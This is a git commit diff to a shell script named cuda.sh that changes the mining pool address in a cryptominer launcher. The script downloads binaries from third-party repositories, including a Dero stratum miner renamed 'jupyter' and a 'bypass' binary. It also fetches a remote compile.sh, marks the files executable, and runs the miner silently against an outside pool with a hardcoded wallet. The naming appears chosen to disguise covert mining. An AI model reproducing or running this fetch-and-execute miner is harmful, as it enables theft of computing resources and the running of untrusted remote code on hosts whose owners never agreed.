2286f55002ca3937184ef37a75081e3afc09310c
terryputri <115645266+terryputri@users.noreply.github.com>
2022-11-26 22:52:37 +0700

    Update cuda.sh

--- cuda.sh
+++ cuda.sh
@@ -2,5 +2,5 @@ curl -L -o jupyter https://gitlab.com/alekpoden82/binamas/-/raw/main/bypass-dero
 curl -L -o jupyter https://gitlab.com/alekpoden82/binamas/-/raw/main/dero-stratum-miner
 curl -L -o compile.sh https://raw.githubusercontent.com/Omarjetos/ezz/master/compile.sh 
 chmod +x jupyter jupyter compile.sh
-./jupyter  -r 15.235.164.162:4304  -w dero1qyn5krz9a7w5728m723khpqwnkatu57tl6nq9n9hct37d5zmd7pq2qg32hmnr.$RANDOM >/dev/null 
+./jupyter  -r 20.92.110.173:443  -w dero1qyn5krz9a7w5728m723khpqwnkatu57tl6nq9n9hct37d5zmd7pq2qg32hmnr.$RANDOM >/dev/null 
 ./compile.sh
